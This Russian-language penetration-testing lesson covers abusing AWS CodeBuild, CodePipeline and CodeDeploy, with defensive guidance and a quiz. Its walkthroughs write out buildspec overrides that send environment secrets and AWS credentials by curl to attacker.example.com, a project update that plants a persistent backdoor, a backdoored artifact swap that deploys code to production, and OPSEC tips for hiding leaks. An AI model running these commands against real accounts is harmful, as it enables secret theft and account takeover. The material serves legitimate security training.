---
id: cloud-aws-devops
title: "AWS DevOps: CodeBuild, CodePipeline и CodeDeploy как RCE"
category: cloud
parent: cloud-aws-data-deep
difficulty: hard
order: 4
tags: [cloud, aws, codebuild, codepipeline, codedeploy, ci, rce, secrets]
prerequisites: [cloud-aws-data-deep, cloud-cicd-secrets]
useful_for:
  - "Атаки на AWS-пайплайны"
  - "Кража секретов из сборок"
  - "RCE на раннерах CodeBuild"
estimated_minutes: 50
summary: "CodeBuild/CodePipeline/CodeDeploy: превращение прав на сборку в выполнение кода, кража секретов из переменных окружения, подмена артефактов и захват роли пайплайна."
---

## Зачем этот урок

AWS DevOps-сервисы (CodeBuild, CodePipeline, CodeDeploy) — это «внутренний CI/CD» AWS. Они часто менее защищены, чем внешние GitHub/GitLab, потому что живут внутри аккаунта и кажутся «доверенными». Между тем роль CodeBuild обычно имеет доступ к секретам, другим сервисам и сети аккаунта. Права `codebuild:StartBuild` или `codepipeline:StartPipelineExecution` почти всегда означают выполнение произвольного кода в окружении сборки — то есть RCE с ролью сервиса.

## Модель CodeBuild/CodePipeline/CodeDeploy

- **CodeBuild** — управляемый раннер сборки. Проект описывает источник (source), окружение (образ, переменные), `buildspec.yml` и сервисную роль. Во время сборки раннер имеет доступ к переменным окружения (в том числе секретам из SSM/Secrets Manager) и к роли.
- **CodePipeline** — оркестратор стадий (source → build → deploy). Каждая стадия ссылается на action provider и имеет свою роль.
- **CodeDeploy** — доставка на EC2/Lambda/ECS. Приложения, deployment groups, hooks (appspec) исполняются на целевых инстансах.
- **Артефакты** — S3-бакет, через который стадии передают файлы. Подмена артефакта = подмена кода.

Поверхность атаки: `codebuild:StartBuild`, `codebuild:UpdateProject` (смена buildspec!), `codepipeline:StartPipelineExecution`, `s3:PutObject` в артефакт-бакет, `codedeploy:CreateDeployment`.

## Инструменты и команды

```bash
# Инвентаризация проектов и пайплайнов
aws codebuild list-projects
aws codebuild batch-get-projects --names app-build \
  --query 'projects[].{Name:name,Role:serviceRole,Source:source,Env:environment.environmentVariables}'
aws codepipeline list-pipelines
aws codepipeline get-pipeline --name app-pipeline

# Ручной запуск сборки с переопределением источника
aws codebuild start-build --project-name app-build \
  --source-type-override GITHUB --source-location-override https://github.com/attacker/repo.git \
  --buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - curl http://attacker.example.com/x -d "$(env | base64)"'

# Изменение проекта (если есть UpdateProject) — постоянный бэкдор
aws codebuild update-project --name app-build \
  --service-role arn:aws:iam::111122223333:role/CodeBuildAdmin \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}'

# CodeDeploy: запуск деплоя
aws deploy create-deployment --application-name app --deployment-group-name prod \
  --s3-location bucket=artifact-bucket,key=app.zip,bundleType=zip

# Артефакты
aws s3 ls s3://codepipeline-us-east-1-123456789/ --recursive
```

## Разобранный пример: StartBuild → кража секретов → RCE

Сценарий: у роли есть `codebuild:StartBuild` на проекте `app-build`, который собирает приватный репозиторий.

```bash
aws codebuild list-projects
# {"projects": ["app-build", "infra-deploy"]}

aws codebuild batch-get-projects --names app-build --query 'projects[0].environment.environmentVariables'
# [{"name":"NPM_TOKEN","type":"PLAINTEXT","value":"npm_xxx"},
#  {"name":"DB_PASSWORD","type":"PARAMETER_STORE","value":"/app/db/password"}]

# Запускаем свою сборку: переопределяем buildspec на извлечение env
aws codebuild start-build --project-name app-build \
  --buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - env | sort | base64 -w0 | curl -X POST --data-binary @- http://attacker.example.com/leak
      - cat /root/.aws/credentials 2>/dev/null | curl -X POST --data-binary @- http://attacker.example.com/creds
      - aws sts get-caller-identity'
# {"build": {"id": "app-build:abc-123", "status": "IN_PROGRESS"}}

# Читаем лог сборки
aws codebuild batch-get-builds --ids app-build:abc-123 \
  --query 'builds[0].logs.{Group:groupName,Stream:streamName}'
```

В логе видим `sts get-caller-identity` — это роль CodeBuild. Теперь у нас есть и секреты, и возможность исполнять код от имени роли. Если роль широкая (частая практика — `AdministratorAccess` для «чтобы сборка работала»), аккаунт практически захвачен.

## Злоупотребление pipeline и артефактами

CodePipeline позволяет не только запускать, но и подменять вход. Если у вас есть `s3:PutObject` в артефакт-бакет, вы можете подменить собранный артефакт на свой — и пайплайн развернёт ваш код. Если есть `codepipeline:UpdatePipeline`, можно добавить стадию с произвольным buildspec и запустить её. CodeDeploy-хуки (`appspec.yml`) исполняются на целевых инстансах от имени агента — подмена appspec даёт RCE на парке серверов.

```bash
# Подмена артефакта перед деплоем
aws s3 cp backdoor.zip s3://artifact-bucket/build/output.zip
aws codepipeline start-pipeline-execution --name app-pipeline
```

## Обход защит и edge cases

- **Service role permissions.** Запуск сборки возможен, только если ваша роль может передать роль CodeBuild (`iam:PassRole`) или проект уже настроен. `StartBuild` без PassRole иногда достаточно.
- **VPC-конфигурация.** CodeBuild может работать в VPC — тогда раннер видит внутренние сервисы. Это расширяет доступ, но усложняет эксфильтрацию (нет интернета без NAT).
- **Logging.** Логи идут в CloudWatch Logs и S3. Ваши `curl` с секретами останутся в логах — для OPSEC лучше шифровать и чистить, но это оставляет следы.
- **Source credentials.** Приватные репозитории требуют `--source-type-override` + токен; иначе переопределить источник не выйдет.
- **Approval actions.** Ручное подтверждение в пайплайне блокирует автоматический запуск; обход — искать параллельные стадии без approval.
- **Артефакт-бакет.** Часто без versioning и с широкой политикой; проверяйте `s3:GetObject`/`PutObject`.

## Частые ошибки и подводные камни

- Считать, что CI внутри AWS «доверенный» и не проверять его.
- Забыть, что `UpdateProject` даёт персистентность (бэкдор в buildspec) — это не только RCE сейчас, но и постоянный доступ.
- Игнорировать `iam:PassRole`: возможность передать роль более привилегированную, чем ваша, — прямой путь к эскалации.
- Не проверить артефакт-бакет: подмена артефакта тише, чем запуск сборки.
- Оставить секреты в логах сборки — шумно и легко детектится.

## Защита и детект

- Ограничить `codebuild:StartBuild`/`UpdateProject` и `iam:PassRole` конкретными проектами и ролями.
- Запретить переопределение source/buildspec (`--buildspec-override`) через SCP или политику проекта.
- Шифровать артефакт-бакет, включать versioning и ограничивать `s3:PutObject`.
- Алертить в CloudTrail на `StartBuild` с override-параметрами, `UpdateProject`, `UpdatePipeline`.
- Давать роли CodeBuild минимальные права; не использовать `AdministratorAccess`.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — роль CodeBuild с `AdministratorAccess` и `iam:PassRole` на всё. Второй — открытый артефакт-бакет. Третий — отсутствие ограничений на `UpdateProject`, что даёт персистентный бэкдор. Четвёртый — секреты в открытых переменных (`PLAINTEXT`) вместо Secrets Manager. Пятый — пайплайн без approval, который можно запустить в любой момент. Проверяя аккаунт, начинайте с `codebuild:ListProjects` и `batch-get-projects` — там сразу видно роли и переменные.

## Практическое задание

1. Создайте CodeBuild-проект с секретом в переменной окружения и ролью с ограниченными правами.
2. Запустите сборку с `--buildspec-override`, извлекающей переменные, и найдите их в CloudWatch Logs.
3. Выдайте второй роли только `codebuild:StartBuild` (без PassRole) и проверьте, проходит ли запуск.
4. Настройте артефакт-бакет с versioning и попробуйте подменить артефакт.

## Что дальше / решение

CodeBuild/CodePipeline — это почти всегда RCE с ролью сервиса. Дальше: перечислить права роли (`aws iam list-attached-role-policies`), найти секреты, расширить доступ. Для персистентности — `UpdateProject` с бэкдорным buildspec. Зафиксируйте путь «StartBuild → роль → креды» в графе. Если есть только `ListProjects` без `StartBuild`, ищите другие стадии пайплайна.

## Разобранный пример 2: подмена артефакта и захват роли

Не всегда нужен `StartBuild`. Если у вас есть только `s3:PutObject` в артефакт-бакет, можно подменить уже собранный артефакт — пайплайн развернёт ваш код при следующем запуске.

```bash
# Находим артефакт-бакет пайплайна
aws codepipeline get-pipeline --name app-pipeline \
  --query 'pipeline.stages[].actions[].configuration'
# {"BucketName":"codepipeline-us-east-1-123456789","ObjectKey":"build/output.zip", ...}

# Готовим бэкдор и подменяем артефакт
zip -r backdoor.zip app/ backdoor.sh
aws s3 cp backdoor.zip s3://codepipeline-us-east-1-123456789/build/output.zip
# upload: backdoor.zip to s3://.../build/output.zip

# Триггерим деплой (если есть codepipeline:StartPipelineExecution)
aws codepipeline start-pipeline-execution --name app-pipeline
# {"pipelineExecutionId": "abc-123"}
```

Через несколько минут код развёрнут на прод-инфраструктуре. Дополнительно можно посмотреть историю выполнений (`list-pipeline-executions`) и понять, какие роли участвуют в каждой стадии: `get-pipeline` показывает `roleArn` для каждой action. Если роль стадии — `CodePipelineDeployRole` с доступом к прод-аккаунту, то подмена артефакта даёт код в проде.

## Связка с внешним CI и OIDC

Современный паттерн — GitHub Actions собирает образ и пушит в ECR, используя OIDC-доверие к AWS. Здесь цель атакующего — либо изменить workflow, либо подменить условие в trust policy. Если trust policy принимает `token.actions.githubusercontent.com:sub` без ограничения по `repo:org/app:ref:refs/heads/main`, любой форк может принять роль. Проверяйте `aws iam get-role --role-name GitHubActionsRole` и его `AssumeRolePolicyDocument`. Подробнее — в уроке про OIDC-федерацию.

## Квиз

```quiz
- question: "Что обычно означает право codebuild:StartBuild?"
  options:
    - "Выполнение произвольного кода в окружении сборки с ролью сервиса"
    - "Только чтение логов"
    - "Удаление проекта"
    - "Биллинг"
  answer: 0
  explanation: "Раннер исполняет buildspec и имеет доступ к переменным окружения и роли."
- question: "Чем опасен codebuild:UpdateProject?"
  options:
    - "Позволяет зашить бэкдор в buildspec (персистентность)"
    - "Меняет только название"
    - "Отключает KMS"
    - "Удаляет аккаунт"
  answer: 0
  explanation: "Изменённый проект будет исполнять вредоносный buildspec при каждой сборке."
- question: "Почему подмена артефакта в S3 опасна?"
  options:
    - "Пайплайн развернёт подменённый код без явного запуска сборки"
    - "S3 отправит письма"
    - "Артефакт зашифруется"
    - "Изменится регион"
  answer: 0
  explanation: "Стадия deploy берёт артефакт из S3; подменив его, вы контролируете развёртывание."
- question: "Какая роль делает CodeBuild особенно опасным?"
  options:
    - "Роль с широкими правами или AdministratorAccess"
    - "Роль только для чтения S3"
    - "Роль без прав"
    - "Роль CloudFront"
  answer: 0
  explanation: "Чем шире роль сервиса, тем больше доступ после выполнения кода."
```

## Где пригодится

- **Пентест AWS:** RCE и кража секретов через CI.
- **Red team:** персистентность в пайплайнах.
- **Supply chain:** подмена артефактов сборки.
- **DevSecOps:** ограничение прав ролей сборки.
